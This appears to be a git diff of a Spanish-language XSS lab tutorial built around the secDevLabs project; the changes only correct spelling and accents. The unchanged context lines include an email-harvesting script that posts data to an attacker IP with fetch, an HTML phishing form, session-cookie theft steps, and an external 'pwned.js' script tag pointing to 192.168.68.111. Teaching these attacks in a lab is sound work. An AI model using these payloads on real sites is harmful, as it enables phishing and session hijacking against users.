@@ -14,21 +14,21 @@ Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:
 
 Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.
 
-A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:
+A continuación, se proporciona el proyecto de GitHub correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:
 
 -   **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
 
 
 ## JavaScript en la web
 
-Los XSS pueden interpretar codigo en **HTML y/o  JavaScript** y es ahi en donde podemos colocar las ineycciones.
+Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en donde podemos colocar las inyecciones.
 
 ```javascript
 <script>alert("XSS")</script>                                /// Creamos una ventana emergente con codigo javascript que dice XSS
 ```
 
 ----
-Podemos crear un script en donde nos devuleva el correo o algun dato a nuestra IP con un servidor hecho con http,  colocamos la IP de nuestro servidor en fetch
+Podemos crear un script en donde nos devuelva el correo o algún dato a nuestra IP con un servidor hecho con http,  colocamos la IP de nuestro servidor en fetch.
 ```javascript
 <script>
     var email = prompt("Por favor, introduce tu correo electronico para visualizar el post", "example@example.com");
@@ -46,7 +46,7 @@ Podemos crear un script en donde nos devuleva el correo o algun dato a nuestra I
 ```
 
 ----
-Tambien lo podemos hacer con HTML (Phishing)
+También lo podemos hacer con HTML (Phishing)
 ```html
 <div id="formContainer"></div>
 
@@ -104,7 +104,7 @@ Podemos crear un Script para redirigir al usuario
 
 Web para identificar un [Json Web Token](https://jwt.io/), este se encuentra en: **Ctrl + Shift + c > Application/Storage > Session**
 
-External JavaScript Source, podemos cargar codigo desde un servidor externo para tratar de robarle la cookie de sesion.
+External JavaScript Source, podemos cargar código desde un servidor externo para tratar de robarle la cookie de sesión.
 * Debemos de ver en la web que no tenga activa el **httpOnly** y se encuentra en **Application** ya que eso impediria poder robarla.
 * Esto seria un **Cookie Hijacking**
 
@@ -127,11 +127,11 @@ request.send();
 ```bash
 ❯ python3 -m http.server 80                                     # Nos montamos un servidor http 80 para recibir las peticiones 
 ```
-Despues de tener la **Cookie de Session** podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y asi cuando recarguemos la pagina, estaremos como el otro usuario.
+Después de tener la **Cookie de Session** podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y así cuando recarguemos la pagina, estaremos como el otro usuario.
 
 ----
 
-Esto lo colcaremos en la web de prueba y crearemos la publicacion
+Esto lo colocaremos en la web de prueba y crearemos la publicación
 ```javascript
 <script src="http://192.168.68.111/pwned.js"></script>
 ```
